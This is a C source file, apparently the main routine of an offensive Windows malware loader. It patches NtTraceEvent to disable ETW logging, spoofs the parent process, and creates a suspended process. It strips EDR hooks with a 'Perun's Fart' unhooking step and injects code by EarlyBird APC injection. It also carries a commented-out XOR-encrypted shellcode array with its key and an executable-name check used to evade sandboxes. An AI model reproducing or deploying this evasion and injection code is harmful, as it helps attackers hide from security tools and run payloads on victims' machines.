

#include <windows.h>
//#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <string.h>
#include "helpers.h"
#include "PEstructs.h"

//unsigned char payload[] = { 0x91, 0x31, 0xf0, 0x81, 0x93, 0x9a, 0xa5, 0x74, 0x6b, 0x65, 0x24, 0x34, 0x2c, 0x29, 0x21, 0x34, 0x35, 0x3a, 0x54, 0xa6, 0xe, 0x2d, 0xee, 0x37, 0xd, 0x31, 0xf8, 0x37, 0x7b, 0x3a, 0xee, 0x26, 0x4b, 0x2d, 0xee, 0x17, 0x3d, 0x31, 0x7c, 0xd2, 0x29, 0x38, 0x28, 0x45, 0xa2, 0x2d, 0x54, 0xa5, 0xc1, 0x45, 0x12, 0x19, 0x61, 0x5e, 0x45, 0x35, 0xaa, 0xac, 0x68, 0x24, 0x6c, 0xb8, 0x91, 0x88, 0x31, 0x33, 0x34, 0x3c, 0xe0, 0x37, 0x45, 0xee, 0x2f, 0x45, 0x3b, 0x64, 0xb3, 0xf9, 0xe5, 0xfc, 0x6b, 0x65, 0x65, 0x2d, 0xe8, 0xb9, 0x7, 0x2, 0x2b, 0x73, 0xb5, 0x24, 0xe0, 0x2d, 0x7d, 0x21, 0xe6, 0x39, 0x53, 0x2c, 0x62, 0xa2, 0x86, 0x22, 0x23, 0x9a, 0xac, 0x24, 0xe6, 0x4d, 0xfb, 0x2d, 0x62, 0xa4, 0x28, 0x45, 0xa2, 0x2d, 0x54, 0xa5, 0xc1, 0x38, 0xb2, 0xac, 0x6e, 0x33, 0x64, 0xb5, 0x53, 0x85, 0x10, 0x94, 0x21, 0x7a, 0x3f, 0x41, 0x6b, 0x37, 0x5c, 0xa5, 0x1e, 0xbd, 0x3d, 0x21, 0xe6, 0x39, 0x57, 0x2c, 0x62, 0xa2, 0x3, 0x35, 0xe0, 0x69, 0x2d, 0x21, 0xe6, 0x39, 0x6f, 0x2c, 0x62, 0xa2, 0x24, 0xff, 0x6f, 0xed, 0x2d, 0x64, 0xbd, 0x38, 0x2b, 0x24, 0x3b, 0x2c, 0x3c, 0x2e, 0x2a, 0x3d, 0x24, 0x3c, 0x2c, 0x23, 0x3b, 0xe6, 0x8f, 0x52, 0x24, 0x26, 0x94, 0x85, 0x3d, 0x24, 0x34, 0x23, 0x3b, 0xee, 0x71, 0x9b, 0x32, 0x8b, 0x94, 0x9a, 0x38, 0x2d, 0xd7, 0x78, 0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x6b, 0x2d, 0xe8, 0xe8, 0x6c, 0x78, 0x73, 0x65, 0x22, 0xc8, 0x54, 0xff, 0x4, 0xe2, 0x9a, 0xb0, 0xd6, 0x89, 0xc6, 0xc7, 0x35, 0x33, 0xdf, 0xd2, 0xfe, 0xd8, 0xf8, 0x9a, 0xb8, 0x31, 0xf0, 0xa1, 0x4b, 0x4e, 0x63, 0x8, 0x61, 0xe5, 0x9e, 0x85, 0x18, 0x7c, 0xc8, 0x22, 0x70, 0x0, 0xa, 0x1e, 0x6b, 0x3c, 0x24, 0xec, 0xb7, 0x86, 0xa6, 0x6, 0x2, 0x1e, 0x6, 0x5a, 0xe, 0x1d, 0x0, 0x65 };
//char key[] = "mysecretkeee";

int main(int argc, char* argv[])
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	/// <summary>
	/// This is for PPID spooofing
	/// </summary>
	STARTUPINFOEX six = { sizeof(six) };
	SIZE_T attributeSize = 0;

	if (strstr(argv[0], "perunsfart.exe") == 0)
	{
		return 0;
	}

	printf("/////////////////////////////////////////////// Patching NtTraceEvent //////////////////////////////////\n");
	etwPatch();

	/// <summary>
	/// if you wish to use ppid spoofing uncomment the ppid function below and comment CreateProcess function in the UNHOOKING part
	/// </summary>
	printf("\n/////////////////////////////////////////////// PPID Spoofing //////////////////////////////////\n");
	pi = ppid(attributeSize, six);
	
	printf("\n/////////////////////////////////////////////// UNHOOKING //////////////////////////////////\n");
	/// Use this CreateProcess function if you don't want ppid spoofing
	/*if (CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, (LPSTARTUPINFOA)&si, &pi) == 0)
		printf("Failed to create process. Error code: %u", GetLastError());*/ 
	printf("[+] Process created in suspended state with pid: %d\n", pi.dwProcessId);
	perunfart(pi.hProcess);

	printf("\n/////////////////////////////////////////////// EarlyBird //////////////////////////////////\n");
	earlybird(pi);
	

	return 0;
}
